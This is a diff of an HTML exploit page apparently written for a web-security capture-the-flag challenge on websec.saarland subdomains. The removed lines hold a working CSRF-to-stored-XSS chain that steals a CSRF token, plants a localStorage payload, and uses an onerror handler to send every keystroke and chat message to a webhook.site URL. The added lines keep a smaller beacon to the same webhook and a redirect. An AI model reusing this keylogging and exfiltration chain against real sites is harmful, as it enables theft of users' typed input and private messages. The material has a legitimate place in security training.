@@ -1,41 +1,19 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Test</title>
+</head>
 <body>
-    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
     <script>
+        // Use a standard string, no backticks, no external scripts.
+        var W = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
+        new Image().src = W + "/?event=ATOMIC_START";
+        
         window.onload = function() {
-            const token = document.forms[0].querySelector('input[name="csrfmiddlewaretoken"]').value;
-            const WEBHOOK = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
-
-            // Optimized Bridge: Poison and Redirect as fast as humanly possible
-            const xss = `<script>
-                document.domain = "owley-madison.jeopardy.websec.saarland";
-                localStorage.setItem('favorites', '["yassin</option><img src=x onerror=\\"document.domain=\\\'owley-madison.jeopardy.websec.saarland\\\';parent.document.addEventListener(\\\'keyup\\\',e=>{new Image().src=\\\'${WEBHOOK}/?k=\\\'+e.key});var s=parent.send_message;parent.send_message=()=>{new Image().src=\\\'${WEBHOOK}/?f=\\\'+parent.document.getElementById(\\\'message\\\').value;s()};\\">"]');
-                location.href = "https://chat.owley-madison.jeopardy.websec.saarland/";
-            <\/script>`;
-
-            var f = document.createElement('form');
-            f.action = "https://diary.owley-madison.jeopardy.websec.saarland/entry";
-            f.method = "POST";
-            f.target = "thrash"; // POST into a hidden frame so we stay on this page to redirect
-            
-            var c = document.createElement('input');
-            c.name = "content"; c.value = xss; f.appendChild(c);
-            
-            var t = document.createElement('input');
-            t.name = "csrfmiddlewaretoken"; t.value = token; f.appendChild(t);
-            
-            document.body.appendChild(f);
-            document.body.appendChild(document.createElement('iframe')).name = "thrash";
-            
-            f.submit();
-
-            // Give the POST 400ms to hit the server, then jump to the diary to trigger
-            setTimeout(() => {
-                window.location.href = "https://diary.owley-madison.jeopardy.websec.saarland/";
-            }, 400);
+            new Image().src = W + "/?event=ATOMIC_LOADED";
+            // Attempt to redirect to the diary immediately
+            location.href = "https://diary.owley-madison.jeopardy.websec.saarland/";
         };
     </script>
-    <form></form>
 </body>
 </html>
